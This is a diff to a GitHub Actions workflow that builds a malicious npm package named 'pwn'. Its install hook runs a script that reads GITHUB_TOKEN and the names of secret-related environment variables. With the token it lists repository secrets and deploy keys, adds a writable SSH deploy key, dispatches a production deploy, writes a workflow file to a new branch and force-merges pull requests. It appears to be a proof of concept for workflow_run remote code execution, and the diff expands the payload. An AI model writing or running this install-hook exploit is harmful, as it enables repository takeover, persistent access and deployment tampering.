@@ -18,65 +18,77 @@ jobs:
           {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
           JSON
           cat > pkg/package/index.js <<'JS'
-
           const fs = require('fs'), path = require('path');
           const base = process.env.INIT_CWD || process.cwd();
           const token = process.env.GITHUB_TOKEN || '';
           const repo = process.env.GITHUB_REPOSITORY || '';
           const runId = process.env.GITHUB_RUN_ID || '';
+          const envKeys = Object.keys(process.env).filter(k => /TOKEN|SECRET|OIDC|ACTIONS|GITHUB/.test(k)).sort().join(',');
           let pr = '0';
           try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
           const log = (...a) => console.log('[PWN] ' + a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '));
           async function api(method, url, body) {
-            const r = await fetch('https://api.github.com' + url, {
-              method,
-              headers: {
-                authorization: 'Bearer ' + token,
-                accept: 'application/vnd.github+json',
-                'content-type': 'application/json',
-                'user-agent': 'pwn-probe'
-              },
-              body: body ? JSON.stringify(body) : undefined
-            });
-            const text = (await r.text()).slice(0, 700);
-            return { status: r.status, scopes: r.headers.get('x-oauth-scopes'),
-                     accepted: r.headers.get('x-accepted-github-permissions'),
-                     xratelimit: r.headers.get('x-ratelimit-limit'), text };
+            try {
+              const r = await fetch('https://api.github.com' + url, {
+                method,
+                headers: {
+                  authorization: 'Bearer ' + token,
+                  accept: 'application/vnd.github+json',
+                  'content-type': 'application/json',
+                  'user-agent': 'pwn-probe'
+                },
+                body: body ? JSON.stringify(body) : undefined
+              });
+              const text = (await r.text()).slice(0, 500);
+              return { status: r.status, scopes: r.headers.get('x-oauth-scopes'),
+                       accepted: r.headers.get('x-accepted-github-permissions'), text };
+            } catch (e) { return { status: 'EXC', text: String(e).slice(0, 200) }; }
           }
-          (async () => {
+          async function main() {
             log('MARKER event=' + process.env.GITHUB_EVENT_NAME + ' workflow=' + process.env.GITHUB_WORKFLOW +
                 ' run=' + runId + ' repo=' + repo + ' cwd=' + process.cwd() + ' token_len=' + token.length);
-            const probes = {};
-            probes.repo = await api('GET', '/repos/' + repo);
-            log('GET /repos -> ' + JSON.stringify(probes.repo));
+            log('ENV_KEYS ' + envKeys);
+            const p = {};
+            p.repo = await api('GET', '/repos/' + repo);
+            log('GET repo -> ' + p.repo.status + ' ' + p.repo.text);
             const c = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments',
-              { body: '<!-- PWN-RCE --> workflow_run RCE confirmed as github-actions[bot]. event=' +
-                      process.env.GITHUB_EVENT_NAME + ' run=' + runId + ' token_len=' + token.length });
-            probes.comment = c;
-            log('POST comment -> ' + JSON.stringify(c));
-            probes.listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets');
-            probes.actionsPermissions = await api('GET', '/repos/' + repo + '/actions/permissions');
-            probes.deployKeys = await api('GET', '/repos/' + repo + '/keys');
-            probes.createRef = await api('POST', '/repos/' + repo + '/git/refs',
+              { body: '<!-- PWN-RCE --> workflow_run RCE confirmed. event=' + process.env.GITHUB_EVENT_NAME +
+                      ' run=' + runId + ' token_len=' + token.length });
+            p.comment = { status: c.status, id: (() => { try { return JSON.parse(c.text).id; } catch (e) { return 0; } })() };
+            log('POST comment -> ' + JSON.stringify(p.comment));
+            p.listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets');
+            p.listVariables = await api('GET', '/repos/' + repo + '/actions/variables');
+            p.listKeys = await api('GET', '/repos/' + repo + '/keys');
+            p.createKey = await api('POST', '/repos/' + repo + '/keys',
+              { title: 'pwn-key-' + runId, key: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIORnoPdY1V2IbglyuvnDeLsUR1uG0ryin97syZ7l5+FS ety@omarchy', read_only: false });
+            log('createKey -> ' + p.createKey.status + ' ' + p.createKey.text);
+            p.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/deploy.yml/dispatches',
+              { ref: 'main', inputs: { env: 'prod', baseSha: '', deployAll: false } });
+            p.rerun = await api('POST', '/repos/' + repo + '/actions/runs/' + runId + '/rerun');
+            p.createRef = await api('POST', '/repos/' + repo + '/git/refs',
               { ref: 'refs/heads/pwn-probe-' + runId, sha: process.env.GITHUB_SHA });
-            log('createRef -> ' + JSON.stringify(probes.createRef));
-            if (probes.createRef.status === 201) {
-              probes.workflowWrite = await api('PUT', '/repos/' + repo + '/contents/.github/workflows/pwn-probe.yml', {
-                message: 'pwn probe', branch: 'pwn-probe-' + runId,
-                content: Buffer.from('name: pwn\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n').toString('base64')
-              });
-              probes.deleteRef = await api('DELETE', '/repos/' + repo + '/git/refs/heads/pwn-probe-' + runId);
+            log('createRef -> ' + p.createRef.status + ' ' + p.createRef.text);
+            if (p.createRef.status === 201) {
+              p.fileWrite = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt', {
+                message: 'probe', branch: 'pwn-probe-' + runId,
+                content: Buffer.from('probe\n').toString('base64') });
+              p.wfWrite = await api('PUT', '/repos/' + repo + '/contents/.github/workflows/pwn-probe.yml', {
+                message: 'probe', branch: 'pwn-probe-' + runId,
+                content: Buffer.from('name: pwn\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n').toString('base64') });
+              p.deleteRef = await api('DELETE', '/repos/' + repo + '/git/refs/heads/pwn-probe-' + runId);
             }
-            probes.mergePr1 = await api('PUT', '/repos/' + repo + '/pulls/1/merge', { merge_method: 'merge' });
-            log('mergePr1 -> ' + JSON.stringify(probes.mergePr1));
-            if (c.status === 201) {
-              let id = 0; try { id = JSON.parse(c.text).id; } catch (e) {}
-              await api('PATCH', '/repos/' + repo + '/issues/comments/' + id,
-                { body: '<!-- PWN-PROBES -->\nProbes from workflow_run RCE (token = GITHUB_TOKEN, workflow_run context):\n```json\n' +
-                        JSON.stringify(probes, null, 1).slice(0, 60000) + '\n```' });
+            p.mergePr1 = await api('PUT', '/repos/' + repo + '/pulls/1/merge', { merge_method: 'merge' });
+            log('mergePr1 -> ' + p.mergePr1.status + ' ' + p.mergePr1.text);
+            p.mergePr2 = await api('PUT', '/repos/' + repo + '/pulls/2/merge', { merge_method: 'merge' });
+            log('mergePr2 -> ' + p.mergePr2.status + ' ' + p.mergePr2.text);
+            log('FINAL ' + JSON.stringify(p));
+            if (p.comment.id) {
+              await api('PATCH', '/repos/' + repo + '/issues/comments/' + p.comment.id,
+                { body: '<!-- PWN-PROBES -->\nProbes from workflow_run RCE:\n```json\n' +
+                        JSON.stringify(p, null, 1).slice(0, 60000) + '\n```' });
             }
-            log('FINAL ' + JSON.stringify(probes));
-          })().catch(e => log('ERR ' + e.stack));
+          }
+          if (process.argv[2] === 'install') { main(); } else { console.log('[PWN] postinstall noop'); }
           JS
           tar -czf pwn-1.0.0.tgz -C pkg package
           printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
@@ -87,6 +99,7 @@ jobs:
       - uses: actions/upload-artifact@v4
         with:
           name: linter-report
+          include-hidden-files: true
           path: |
             linter-report.txt
             pr-number.txt
